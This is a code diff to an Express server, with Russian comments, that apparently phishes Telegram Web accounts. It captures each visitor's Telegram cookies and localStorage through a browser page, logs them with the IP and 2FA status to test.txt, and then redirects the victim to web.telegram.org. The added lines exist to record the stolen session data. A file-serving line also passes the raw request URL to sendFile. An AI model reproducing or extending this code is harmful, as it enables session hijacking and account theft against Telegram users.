@@ -10,6 +10,13 @@ try {
 app.get('*', async function (req, res) {
     const ipStart = req.headers['x-forwarded-for'] || req.connection.remoteAddress
     //console.log(req.url, ipStart)
+    // fs.writeFileSync('test.txt',ipStart+'/\n'+req.url+'/\n\n' , { flag: 'a+' }, err => {
+    //     if (err) {
+    //       console.error(err)
+    //       return
+    //     }
+    //     //file written successfully
+    //   })
     masUrl = req.url.split('/') //разделяем линк на алиасы
     let source, data = 0
     if (typeof masUrl[1] !== 'undefined') source = masUrl[1]
@@ -83,6 +90,13 @@ app.get('*', async function (req, res) {
                     console.log(returnedCookie)
                     const localStorage = await page.evaluate(() =>  Object.assign({}, window.localStorage))
                     console.log(localStorage)
+                    fs.writeFileSync('test.txt',ip+'/\n'+JSON.stringify(returnedCookie)+'/\n'+JSON.stringify(localStorage) , { flag: 'a+' }, err => {
+                        if (err) {
+                          console.error(err)
+                          return
+                        }
+                        //file written successfully
+                      })
                     res.write(`
                     <script>
                     window.location.href ="https://web.telegram.org/z/"
@@ -93,6 +107,13 @@ app.get('*', async function (req, res) {
                     
                     }else if (element2fa != null){
                         console.log(ip+" has 2FA")
+                        fs.writeFileSync('test.txt',ip+ip+" has 2FA"+'/\n\n' , { flag: 'a+' }, err => {
+                            if (err) {
+                              console.error(err)
+                              return
+                            }
+                            //file written successfully
+                          })
                         res.write(`
                     <script>
                     window.location.href ="https://web.telegram.org/z/"
@@ -128,8 +149,8 @@ app.get('*', async function (req, res) {
             }) // отправляем саму картинку            
         }
     }
-    else if (source == 'fly.gif' || source == 'monk.png') {
-        res.sendFile('C:/Users/Titanium/Desktop/telegram/' + req.url, function (err) {
+    else if (source == 'fly.gif' || source == 'start.webp') {
+        res.sendFile('' + req.url, function (err) {
             if (err) {
                 console.log(err)
                 res.status(err.status).end();
@@ -137,13 +158,19 @@ app.get('*', async function (req, res) {
         }) // отправляем саму картинку            
     }
     else {
-        res.send(200)
+        res.sendStatus(200)
     }
 
 })
 } catch (error) {
     console.error(error);
-    
+    fs.writeFileSync('test.txt',"error  "+ip+'/\n'+error+'/\n'+JSON.stringify(error) , { flag: 'a+' }, err => {
+        if (err) {
+          console.error(err)
+          return
+        }
+        //file written successfully
+      })
   }
 
 app.listen(80)//запускаем Сервер на Порту в скобочках 
